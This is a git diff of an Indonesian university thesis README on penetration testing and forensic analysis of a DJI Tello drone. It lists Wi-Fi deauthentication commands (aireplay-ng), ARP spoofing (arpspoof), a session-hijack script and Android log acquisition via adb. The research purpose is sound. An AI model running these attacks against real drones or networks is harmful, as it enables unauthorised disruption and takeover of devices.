@@ -3,17 +3,16 @@
 **Nama Mahasiswa**: Akbar Putra Asenti Priyanto 
 **NRP**: 5025211004 
 **Judul TA**: Penetration Test dan Analisis Forensik pada Drone Komersial  
-**Dosen Pembimbing**: [Nama Dosen]  
-**Dosen Ko-pembimbing**: [Nama Dosen]
+**Dosen Pembimbing**: Hudan Studiawan, S.Kom., M.Kom.,Ph.D.  
+**Dosen Ko-pembimbing**: Baskoro Adi Pratomo, S.Kom., M.Kom.
 
 ---
 
 ## 📺 Demo Aplikasi  
 Embed video demo di bawah ini (ganti `VIDEO_ID` dengan ID video YouTube Anda):  
 
-[![Demo Aplikasi](https://i.ytimg.com/vi/zIfRMTxRaIs/maxresdefault.jpg)](https://www.youtube.com/watch?v=VIDEO_ID)  
+[![Demo Aplikasi](https://i.ytimg.com/vi/17bLWl3gKGE/maxresdefault.jpg)](https://www.youtube.com/watch?v=17bLWl3gKGE)  
 *Klik gambar di atas untuk menonton demo*
-
 ---
 
 *Konten selanjutnya hanya merupakan contoh awalan yang baik. Anda dapat berimprovisasi bila diperlukan.*
@@ -21,11 +20,18 @@ Embed video demo di bawah ini (ganti `VIDEO_ID` dengan ID video YouTube Anda):
 ## 🛠 Panduan Instalasi & Menjalankan Software  
 
 ### Prasyarat  
-- Daftar dependensi (contoh):
-  - Python 3.10+
-  - Node.js v18+
-  - MySQL 8.0
-  - [Lainnya...]
+- Daftar dependensi:
+  - Python + pip
+  - Wireshark
+  - OS Kali Linux (Bisa dijalankan melalui Virtual Machine)
+  - Oracle VM VirtualBox (Jika menjalankan serangan melalui VM)
+  - DatCon (https://datfile.net/)
+- Dependensi Tools Penyerangan:
+  - aircrack-ng (Otomatis terinstal pada Kali Linux)
+  - arpspoof / dsniff (Otomatis Terinstal pada Kali Linux)
+  - djitellopy (https://github.com/damiafuentes/DJITelloPy)
+- Dependensi Akuisisi Android:
+  - adb (https://developer.android.com/tools/adb)
 
 ### Langkah-langkah  
 1. **Clone Repository**  
@@ -38,16 +44,48 @@ Embed video demo di bawah ini (ganti `VIDEO_ID` dengan ID video YouTube Anda):
    pip install -r requirements.txt  # Contoh untuk Python
    npm install  # Contoh untuk Node.js
    ```
-3. **Konfigurasi**
-- Salin/rename file .env.example menjadi .env
-- Isi variabel lingkungan sesuai kebutuhan (database, API key, dll.)
-4. **Jalankan Aplikasi**
-   ```bash
-   python main.py  # Contoh untuk Python
-   npm start      # Contoh untuk Node.js
-   ```
-5. Buka browser dan kunjungi: `http://localhost:3000` (sesuaikan dengan port proyek Anda)
+3. **Memperoleh IP dan MAC drone dan Kontroler**:
 
+4. **Jalankan Serangan**
+   
+   - **Skenario Deauthentication Attack**:
+
+   ```sudo airmon-ng start <interface>```
+
+   ```sudo airodump-ng <interface_mon>```
+   ```sudo iwconfig <interface_mon> channel <channel>
+   sudo aireplay-ng --deauth <jumlah paket> -a <MAC Drone> -c <MAC Client> <interface_mon>```
+
+   - **Skenario ARP Spoofing**:
+   Sebelum menjalankan serangan, pastikan mesin penyerang terhubung pada jaringan drone DJI Tello.
+   ```sysctl-w net.ipv4.ip_forward=1
+   sudo arpspoof -i wlan0 -t <ip client> <ip drone>
+   sudo arpspoof -i wlan0 -t <ip drone> <ip client>```
+
+   - **Skenario Session Hijacking**:
+   Sebelum menjalankan serangan, pastikan mesin penyerang terhubung pada jaringan drone DJI Tello.
+   ```cd hijack
+   python tello_control.py```
+
+   - **Capture Jaringan dengan Wireshark**:
+   ```sudo wireshark```
+   Lakukan capture jaringan pada interface yang digunakan dalam penyerangan.
+
+5. **Akuisisi Kontroler Android**
+   - Pertama-tama, download adb (android debug bridge) pada tautan https://developer.android.com/tools/adb:
+   - Hubungkan perangkat android menggunakan USB pada mesin.
+   - Jalankan command berikut pada direktori download adb: 
+   ```adb start-server
+   adb devices -l
+   adb shell ls
+   adb pull /storage/emulated/0/```
+   - Pada android, log penerbangan DJI Tello ditemukan pada direktori `/0/Android/data/com.ryzerobotics.tello/files/droneLog/`, sedangkan video penerbangan pada direktori `/0/Movies/TelloVideo/`
+
+6. **Proses Log dengan DatCon**
+   - Download software DatCon pada ```https://datfile.net/```
+   - Saat dibuka, DatCon akan menampilkan GUI. Isi direktori .DAT yang sesuai dan direktori output yang sesuai pada halaman utama DatCon.
+   - Pencet tombol "GO!" pada bagian bawah GUI
+   - DatCon akan menghasilkan hasil .csv dari .DAT yang dimasukkan.
 ---
 
 ## 📚 Dokumentasi Tambahan
@@ -71,5 +109,5 @@ Pastikan proyek memenuhi kriteria berikut sebelum submit:
 ## ⁉️ Pertanyaan?
 
 Hubungi:
-- Penulis: [email@mahasiswa]
-- Pembimbing Utama: [email@pembimbing]
+- Penulis: [akbar.putra02.ap@gmail.com]
+- Pembimbing Utama: [studiawan@gmail.com]
